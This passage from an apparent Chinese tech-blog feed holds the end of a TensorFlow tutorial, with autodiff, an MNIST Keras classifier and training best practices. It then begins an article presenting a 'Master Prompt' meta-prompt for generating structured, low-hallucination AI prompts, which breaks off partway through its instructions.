<span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出: 27.0</span>
</code></pre>
<h3 data-id="heading-9">自动微分</h3>
<p>自动微分是深度学习的核心机制,它自动计算函数的导数,用于反向传播算法。TensorFlow 通过 <code>tf.GradientTape</code> 实现自动微分。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建一个变量</span>
x = tf.Variable(<span class="hljs-number">3.0</span>)

<span class="hljs-comment"># 记录计算过程</span>
<span class="hljs-keyword">with</span> tf.GradientTape() <span class="hljs-keyword">as</span> tape:
    y = x * x + <span class="hljs-number">2</span>

<span class="hljs-comment"># 计算梯度</span>
grad = tape.gradient(y, x)
<span class="hljs-built_in">print</span>(grad)  <span class="hljs-comment"># 输出: 6.0 (dy/dx = 2x = 2*3 = 6)</span>
</code></pre>
<h3 data-id="heading-10">核心概念关系图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[张量 Tensor] --&gt; B[数据载体]
    A --&gt; C[基本运算单元]
    D[变量 Variable] --&gt; A
    D --&gt; E[可训练参数]
    D --&gt; F[训练过程更新]
    G[Eager Execution] --&gt; H[即时执行模式]
    G --&gt; I[便于调试]
    J[tf.function] --&gt; K[计算图编译]
    J --&gt; L[性能优化]
    M[自动微分] --&gt; N[梯度计算]
    M --&gt; O[反向传播]
    P[tf.GradientTape] --&gt; M
</code></pre>
<h2 data-id="heading-11">4. 实战演练:解决一个典型问题</h2>
<p>让我们通过构建一个手写数字识别模型来体验 TensorFlow 的完整工作流程。这个项目将使用经典的 MNIST 数据集,它包含 60000 张训练图像和 10000 张测试图像,每张图像是 28×28 像素的灰度手写数字(0-9)。</p>
<h3 data-id="heading-12">需求分析</h3>
<p>我们的目标是构建一个神经网络模型,能够自动识别手写数字的类别(0-9)。这是一个典型的图像分类问题,需要完成以下步骤:</p>
<ol>
<li>加载并预处理 MNIST 数据集</li>
<li>构建一个多层神经网络模型</li>
<li>训练模型并评估性能</li>
<li>使用模型进行预测</li>
</ol>
<h3 data-id="heading-13">方案设计</h3>
<p>我们将使用 <code>tf.keras</code> 高级 API 来构建模型,它提供了简洁的接口来定义网络结构。模型将采用以下架构:</p>
<ul>
<li>输入层:展平 28×28 的图像为 784 维向量</li>
<li>隐藏层:包含 128 个神经元的全连接层,使用 ReLU 激活函数</li>
<li>Dropout 层:以 0.2 的概率丢弃神经元,防止过拟合</li>
<li>输出层:10 个神经元的全连接层,使用 Softmax 激活函数输出每个类别的概率</li>
</ul>
<h3 data-id="heading-14">代码实现</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># 1. 加载 MNIST 数据集</span>
mnist = tf.keras.datasets.mnist
(x_train, y_train), (x_test, y_test) = mnist.load_data()

<span class="hljs-comment"># 预处理数据:将像素值归一化到 [0, 1] 范围</span>
x_train, x_test = x_train / <span class="hljs-number">255.0</span>, x_test / <span class="hljs-number">255.0</span>

<span class="hljs-comment"># 2. 构建模型</span>
model = tf.keras.models.Sequential([
    tf.keras.layers.Flatten(input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),  <span class="hljs-comment"># 展平图像</span>
    tf.keras.layers.Dense(<span class="hljs-number">128</span>, activation=<span class="hljs-string">'relu'</span>),   <span class="hljs-comment"># 隐藏层</span>
    tf.keras.layers.Dropout(<span class="hljs-number">0.2</span>),                    <span class="hljs-comment"># Dropout 层</span>
    tf.keras.layers.Dense(<span class="hljs-number">10</span>, activation=<span class="hljs-string">'softmax'</span>)  <span class="hljs-comment"># 输出层</span>
])

<span class="hljs-comment"># 编译模型:指定优化器、损失函数和评估指标</span>
model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">'adam'</span>,
              loss=<span class="hljs-string">'sparse_categorical_crossentropy'</span>,
              metrics=[<span class="hljs-string">'accuracy'</span>])

<span class="hljs-comment"># 3. 训练模型</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"开始训练模型..."</span>)
history = model.fit(x_train, y_train, epochs=<span class="hljs-number">5</span>, 
                    validation_split=<span class="hljs-number">0.1</span>)

<span class="hljs-comment"># 4. 评估模型性能</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n评估模型性能:"</span>)
test_loss, test_acc = model.evaluate(x_test, y_test, verbose=<span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试集准确率: <span class="hljs-subst">{test_acc:<span class="hljs-number">.4</span>f}</span>"</span>)

<span class="hljs-comment"># 5. 进行预测</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n进行预测示例:"</span>)
predictions = model.predict(x_test[:<span class="hljs-number">5</span>])
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
    predicted_label = np.argmax(predictions[i])
    true_label = y_test[i]
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"图像 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>: 预测=<span class="hljs-subst">{predicted_label}</span>, 真实=<span class="hljs-subst">{true_label}</span>"</span>)

<span class="hljs-comment"># 保存模型</span>
model.save(<span class="hljs-string">'mnist_model.keras'</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\n模型已保存为 mnist_model.keras"</span>)
</code></pre>
<h3 data-id="heading-15">运行说明</h3>
<p>将上述代码保存为 <code>mnist_classifier.py</code> 并运行:</p>
<pre><code class="hljs language-bash" lang="bash">python mnist_classifier.py
</code></pre>
<p>程序会输出训练过程中的损失值和准确率,最终在测试集上的准确率通常能达到 97% 以上。</p>
<p><strong>预期输出示例</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">开始训练模型...</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">1</span><span class="hljs-string">/5</span>
<span class="hljs-number">1688</span><span class="hljs-string">/1688</span> [<span class="hljs-string">==============================</span>] <span class="hljs-bullet">-</span> <span class="hljs-attr">3s 2ms/step - loss: 0.2958 - accuracy: 0.9141 - val_loss: 0.1483 - val_accuracy:</span> <span class="hljs-number">0.9578</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">2</span><span class="hljs-string">/5</span>
<span class="hljs-number">1688</span><span class="hljs-string">/1688</span> [<span class="hljs-string">==============================</span>] <span class="hljs-bullet">-</span> <span class="hljs-attr">3s 2ms/step - loss: 0.1426 - accuracy: 0.9578 - val_loss: 0.1084 - val_accuracy:</span> <span class="hljs-number">0.9667</span>
<span class="hljs-string">...</span>
<span class="hljs-string">Epoch</span> <span class="hljs-number">5</span><span class="hljs-string">/5</span>
<span class="hljs-number">1688</span><span class="hljs-string">/1688</span> [<span class="hljs-string">==============================</span>] <span class="hljs-bullet">-</span> <span class="hljs-attr">3s 2ms/step - loss: 0.0990 - accuracy: 0.9707 - val_loss: 0.0928 - val_accuracy:</span> <span class="hljs-number">0.9725</span>

<span class="hljs-string">评估模型性能:</span>
<span class="hljs-attr">313/313 - 0s - loss: 0.0911 - accuracy:</span> <span class="hljs-number">0.9723</span>
<span class="hljs-string">测试集准确率:</span> <span class="hljs-number">0.9723</span>

<span class="hljs-string">进行预测示例:</span>
<span class="hljs-string">图像</span> <span class="hljs-attr">1:</span> <span class="hljs-string">预测=7,</span> <span class="hljs-string">真实=7</span>
<span class="hljs-string">图像</span> <span class="hljs-attr">2:</span> <span class="hljs-string">预测=2,</span> <span class="hljs-string">真实=2</span>
<span class="hljs-string">图像</span> <span class="hljs-attr">3:</span> <span class="hljs-string">预测=1,</span> <span class="hljs-string">真实=1</span>
<span class="hljs-string">图像</span> <span class="hljs-attr">4:</span> <span class="hljs-string">预测=0,</span> <span class="hljs-string">真实=0</span>
<span class="hljs-string">图像</span> <span class="hljs-attr">5:</span> <span class="hljs-string">预测=4,</span> <span class="hljs-string">真实=4</span>

<span class="hljs-string">模型已保存为</span> <span class="hljs-string">mnist_model.keras</span>
</code></pre>
<h2 data-id="heading-16">5. 最佳实践与常见陷阱</h2>
<h3 data-id="heading-17">常见错误</h3>
<p><strong>错误 1: 混淆张量和变量的使用</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法:试图修改常量张量</span>
x = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
x[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>  <span class="hljs-comment"># 会抛出错误</span>

<span class="hljs-comment"># ✅ 正确做法:使用变量存储需要更新的数据</span>
x = tf.Variable([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
x[<span class="hljs-number">0</span>].assign(<span class="hljs-number">10</span>)  <span class="hljs-comment"># 正确</span>
</code></pre>
<p><strong>错误 2: 忽略数据类型转换</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法:数据类型不匹配导致计算错误</span>
a = tf.constant([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], dtype=tf.int32)
b = tf.constant([<span class="hljs-number">1.5</span>, <span class="hljs-number">2.5</span>], dtype=tf.float32)
c = a + b  <span class="hljs-comment"># 可能产生意外结果</span>

<span class="hljs-comment"># ✅ 正确做法:显式转换数据类型</span>
a = tf.cast(a, tf.float32)
c = a + b  <span class="hljs-comment"># 正确</span>
</code></pre>
<p><strong>错误 3: 滥用 Eager Execution 导致性能下降</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法:在训练循环中直接调用函数(性能差)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">train_step</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-comment"># ... 训练逻辑</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
    train_step(x_batch, y_batch)

<span class="hljs-comment"># ✅ 正确做法:使用 tf.function 优化性能</span>
<span class="hljs-meta">@tf.function</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">train_step</span>(<span class="hljs-params">x, y</span>):
    <span class="hljs-comment"># ... 训练逻辑</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):
    train_step(x_batch, y_batch)
</code></pre>
<h3 data-id="heading-18">最佳实践</h3>
<p><strong>1. 使用 tf.data.Dataset 构建高效数据管道</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用 tf.data.Dataset 提高数据加载效率</span>
train_dataset = tf.data.Dataset.from_tensor_slices((x_train, y_train))
train_dataset = train_dataset.shuffle(buffer_size=<span class="hljs-number">10000</span>)
train_dataset = train_dataset.batch(<span class="hljs-number">32</span>)
train_dataset = train_dataset.prefetch(tf.data.AUTOTUNE)

<span class="hljs-comment"># 在训练中使用 dataset</span>
model.fit(train_dataset, epochs=<span class="hljs-number">5</span>)
</code></pre>
<p><strong>2. 使用 Callback 监控训练过程</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用 ModelCheckpoint 保存最佳模型</span>
checkpoint_callback = tf.keras.callbacks.ModelCheckpoint(
    <span class="hljs-string">'best_model.keras'</span>,
    monitor=<span class="hljs-string">'val_accuracy'</span>,
    save_best_only=<span class="hljs-literal">True</span>,
    mode=<span class="hljs-string">'max'</span>
)

<span class="hljs-comment"># 使用 EarlyStopping 防止过拟合</span>
early_stop_callback = tf.keras.callbacks.EarlyStopping(
    monitor=<span class="hljs-string">'val_loss'</span>,
    patience=<span class="hljs-number">3</span>,
    restore_best_weights=<span class="hljs-literal">True</span>
)

model.fit(x_train, y_train, 
          epochs=<span class="hljs-number">100</span>,
          validation_split=<span class="hljs-number">0.2</span>,
          callbacks=[checkpoint_callback, early_stop_callback])
</code></pre>
<p><strong>3. 合理使用 GPU 加速</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 检查 GPU 是否可用</span>
gpus = tf.config.list_physical_devices(<span class="hljs-string">'GPU'</span>)
<span class="hljs-keyword">if</span> gpus:
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 限制 GPU 内存使用,避免占用全部显存</span>
        <span class="hljs-keyword">for</span> gpu <span class="hljs-keyword">in</span> gpus:
            tf.config.experimental.set_memory_growth(gpu, <span class="hljs-literal">True</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"发现 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(gpus)}</span> 个 GPU 设备"</span>)
    <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(e)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"未发现 GPU 设备,将使用 CPU"</span>)
</code></pre>
<p><strong>4. 使用 TensorBoard 可视化训练过程</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 创建 TensorBoard 回调</span>
tensorboard_callback = tf.keras.callbacks.TensorBoard(
    log_dir=<span class="hljs-string">'./logs'</span>,
    histogram_freq=<span class="hljs-number">1</span>
)

<span class="hljs-comment"># 训练时启用 TensorBoard</span>
model.fit(x_train, y_train,
          epochs=<span class="hljs-number">10</span>,
          validation_split=<span class="hljs-number">0.2</span>,
          callbacks=[tensorboard_callback])

<span class="hljs-comment"># 在终端启动 TensorBoard</span>
<span class="hljs-comment"># tensorboard --logdir=./logs</span>
</code></pre>
<h3 data-id="heading-19">注意事项</h3>
<ul>
<li><strong>版本兼容性</strong>:TensorFlow 不同版本的 API 可能有差异,务必查阅对应版本的官方文档</li>
<li><strong>GPU 配置</strong>:使用 GPU 版本时,确保 CUDA 和 cuDNN 版本与 TensorFlow 版本匹配</li>
<li><strong>内存管理</strong>:处理大型数据集时,使用生成器或 <code>tf.data.Dataset</code> 避免内存溢出</li>
<li><strong>模型保存</strong>:推荐使用 <code>.keras</code> 格式保存模型,它包含完整的模型架构和权重</li>
</ul>
<h2 data-id="heading-20">6. 进阶指引</h2>
<h3 data-id="heading-21">高级功能</h3>
<p>TensorFlow 提供了许多高级功能,满足不同场景的需求:</p>
<ul>
<li><strong>自定义层和模型</strong>:通过继承 <code>tf.keras.layers.Layer</code> 和 <code>tf.keras.Model</code> 创建自定义组件</li>
<li><strong>分布式训练</strong>:使用 <code>tf.distribute.Strategy</code> 在多 GPU 或多机器上加速训练</li>
<li><strong>混合精度训练</strong>:通过 <code>tf.keras.mixed_precision</code> 在保持精度的同时提升性能和节省显存</li>
<li><strong>TensorFlow Lite</strong>:将模型部署到移动设备和嵌入式系统</li>
<li><strong>TensorFlow.js</strong>:在浏览器中运行模型,实现端到端的 Web AI 应用</li>
</ul>
<h3 data-id="heading-22">生态扩展</h3>
<p>TensorFlow 拥有丰富的生态系统:</p>
<ul>
<li><strong>TensorFlow Hub</strong>:预训练模型库,可以直接使用或微调</li>
<li><strong>TensorFlow Datasets</strong>:大量标准数据集,方便快速实验</li>
<li><strong>TensorFlow Probability</strong>:概率建模和贝叶斯推理工具</li>
<li><strong>TensorFlow Extended (TFX)</strong>:生产级机器学习流水线工具</li>
</ul>
<h3 data-id="heading-23">学习路径</h3>
<p>掌握了基础知识后,你可以按照以下路径继续深造:</p>
<ol>
<li><strong>深入学习</strong>:阅读《Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow》</li>
<li><strong>官方文档</strong>:深入研读 TensorFlow 官方文档,了解底层 API 和高级特性</li>
<li><strong>项目实践</strong>:参与 Kaggle 竞赛或在 GitHub 上开源项目</li>
<li><strong>关注社区</strong>:关注 TensorFlow Blog 和 GitHub 仓库,了解最新动态</li>
<li><strong>探索研究</strong>:阅读顶级会议论文,使用 TensorFlow 实现前沿算法</li>
</ol>
<p>TensorFlow 是一个功能强大且不断演进的平台,保持学习和实践是掌握它的关键。祝你在这个充满可能性的 AI 领域探索愉快!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Prompt_Master Prompt：一键生成专家级 AI 提示词]]></title>    <link>https://juejin.cn/post/7602252722373853235</link>    <guid>https://juejin.cn/post/7602252722373853235</guid>    <pubDate>2026-02-03T06:32:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602252722373853235" data-draft-id="7602280520961032218" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Prompt_Master Prompt：一键生成专家级 AI 提示词"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-02-03T06:32:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="暖阳_"/> <meta itemprop="url" content="https://juejin.cn/user/1662117312465406"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Prompt_Master Prompt：一键生成专家级 AI 提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1662117312465406/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    暖阳_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:32:29.000Z" title="Tue Feb 03 2026 06:32:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Master Prompt：一键生成专家级 AI 提示词</h2>
<p><strong>原文链接</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fnewsletter.deepwriting.ai%2Fp%2Fmaster-prompt-generator-ai" target="_blank" title="https://newsletter.deepwriting.ai/p/master-prompt-generator-ai" ref="nofollow noopener noreferrer">newsletter.deepwriting.ai/p/master-pr…</a></p>
<hr/>
<p><em>来源：Deep Writing | 作者：Tuhin Patra | 2025年2月21日</em></p>
<h3 data-id="heading-1">引言</h3>
<p>写提示词很痛苦。</p>
<p>你盯着空白输入框，不知道从哪开始、该输入什么才能得到想要的结果。</p>
<p>大多数时候，你会用泛泛的提示词产出平庸内容，或者花几个小时和 AI 来回拉扯，才能勉强得到一点可用的东西。</p>
<p>大量时间和精力被浪费。</p>
<p>如果能在不面对空白页的情况下，为任何写作任务生成一个基线提示词呢？</p>
<p>今天分享 <strong>The Master Prompt（主提示词）</strong>——一个充当你的私人提示工程师、能根据你的具体需求生成结构化提示词的提示词。</p>
<hr/>
<h3 data-id="heading-2">The Master Prompt（主提示词全文）</h3>
<p>下面这段主提示词可以成为你完成任何 AI 任务的起点。</p>
<p>在 <strong>ChatGPT o1</strong>、<strong>o3</strong> 和 <strong>Gemini 2.0 Flash Thinking</strong> 等擅长遵循结构化指令、理解提示词细微差别的推理模型上效果最好。</p>
<p>使用后，AI 会先针对你的具体需求提问，再生成一个结构清晰、可直接作为起点的提示词。</p>
<p>你不再从零开始，而是得到一个可在此基础上继续打磨的基线提示词。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">&lt;System&gt;
You are a Prompt Generator, specializing <span class="hljs-keyword">in</span> creating well-structured, verifiable, <span class="hljs-built_in">and</span> low-hallucination prompts <span class="hljs-keyword">for</span> any desired use <span class="hljs-keyword">case</span>. Your role <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> understand user requirements, break down complex tasks, <span class="hljs-built_in">and</span> coordinate <span class="hljs-string">"expert"</span> personas <span class="hljs-keyword">if</span> needed <span class="hljs-keyword">to</span> verify <span class="hljs-built_in">or</span> refine solutions. You can ask clarifying questions <span class="hljs-keyword">when</span> critical details are missing. Otherwise, minimize friction.

Informed <span class="hljs-keyword">by</span> meta-prompting best practices:
<span class="hljs-number">1</span>. **Decompose tasks** <span class="hljs-keyword">into</span> smaller <span class="hljs-built_in">or</span> simpler subtasks <span class="hljs-keyword">when</span> the user<span class="hljs-comment">'s request is complex.</span>
<span class="hljs-number">2</span>. Engage <span class="hljs-string">"fresh eyes"</span> <span class="hljs-keyword">by</span> consulting additional experts <span class="hljs-keyword">for</span> independent reviews. Avoid reusing the same <span class="hljs-string">"expert"</span> <span class="hljs-keyword">for</span> both creation <span class="hljs-built_in">and</span> validation <span class="hljs-keyword">of</span> solutions.
<span class="hljs-number">3</span>. Emphasize iterative verification, especially <span class="hljs-keyword">for</span> tasks that might produce errors <span class="hljs-built_in">or</span> hallucinations. 
<span class="hljs-number">4</span>. Discourage guessing. Instruct systems <span class="hljs-keyword">to</span> disclaim uncertainty <span class="hljs-keyword">if</span> lacking data.
<span class="hljs-number">5</span>. <span class="hljs-keyword">If</span> advanced computations <span class="hljs-built_in">or</span> code are needed, spawn a specialized <span class="hljs-string">"Expert Python"</span> persona <span class="hljs-keyword">to</span> generate <span class="hljs-built_in">and</span> (<span class="hljs-keyword">if</span> desired) execute code safely <span class="hljs-keyword">in</span> a sandbox.
<span class="hljs-number">6</span>. Adhere <span class="hljs-keyword">to</span> a succinct format; only ask the user <span class="hljs-keyword">for</span> clarifications <span class="hljs-keyword">when</span> necessary <span class="hljs-keyword">to</span> achieve accurate results.
&lt;/System&gt;

&lt;Context&gt;
Users come <span class="hljs-keyword">to</span> you <span class="hljs-keyword">with</span> an initial idea, goal, <span class="hljs-built_in">or</span> prompt they want <span class="hljs-keyword">to</span> refine. They may be unsure how <span class="hljs-keyword">to</span> <span class="hljs-keyword">structure</span> it, what constraints <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span>, <span class="hljs-built_in">or</span> how <span class="hljs-keyword">to</span> minimize factual errors. Your meta-prompting approach—<span class="hljs-keyword">where</span> you can coordinate multiple specialized experts <span class="hljs-keyword">if</span> needed—aims <span class="hljs-keyword">to</span> produce a carefully verified, high-quality final prompt.
&lt;/Context&gt;

&lt;Instructions&gt;
<span class="hljs-number">1</span>. **Request the Topic**  
   - Prompt the user <span class="hljs-keyword">for</span> the primary goal <span class="hljs-built_in">or</span> role <span class="hljs-keyword">of</span> the system they want <span class="hljs-keyword">to</span> create.  
   - <span class="hljs-keyword">If</span> the request <span class="hljs-built_in">is</span> ambiguous, ask the minimum number <span class="hljs-keyword">of</span> clarifying questions required.

<span class="hljs-number">2</span>. **Refine the Task**  
   - Confirm the user<span class="hljs-comment">'s purpose, expected outputs, and any known data sources or references.  </span>
   - Encourage the user <span class="hljs-keyword">to</span> specify how they want <span class="hljs-keyword">to</span> handle factual accuracy (e.g., disclaimers <span class="hljs-keyword">if</span> uncertain).

<span class="hljs-number">3</span>. **Decompose &amp; Assign Experts** (Only <span class="hljs-keyword">if</span> needed)  
   - <span class="hljs-keyword">For</span> complex tasks, break the user<span class="hljs-comment">'s query into logical subtasks.  </span>
   - Summon specialized <span class="hljs-string">"expert"</span> personas (e.g., <span class="hljs-string">"Expert Mathematician,"</span> <span class="hljs-string">"Expert Essayist,"</span> <span class="hljs-string">"Expert Python,"</span> etc.) <span class="hljs-keyword">to</span> solve <span class="hljs-built_in">or</span> verify <span class="hljs-keyword">each</span> subtask.  
   - Use <span class="hljs-string">"fresh eyes"</span> <span class="hljs-keyword">to</span> cross-check solutions. Provide complete instructions <span class="hljs-keyword">to</span> <span class="hljs-keyword">each</span> expert because they have no memory <span class="hljs-keyword">of</span> prior interactions.

<span class="hljs-number">4</span>. **Minimize Hallucination**  
   - Instruct the system <span class="hljs-keyword">to</span> verify <span class="hljs-built_in">or</span> disclaim <span class="hljs-keyword">if</span> uncertain.  
   - Encourage referencing specific data sources <span class="hljs-built_in">or</span> instruct the system <span class="hljs-keyword">to</span> ask <span class="hljs-keyword">for</span> them <span class="hljs-keyword">if</span> the user wants maximum factual reliability.

<span class="hljs-number">5</span>. **Define Output Format**  
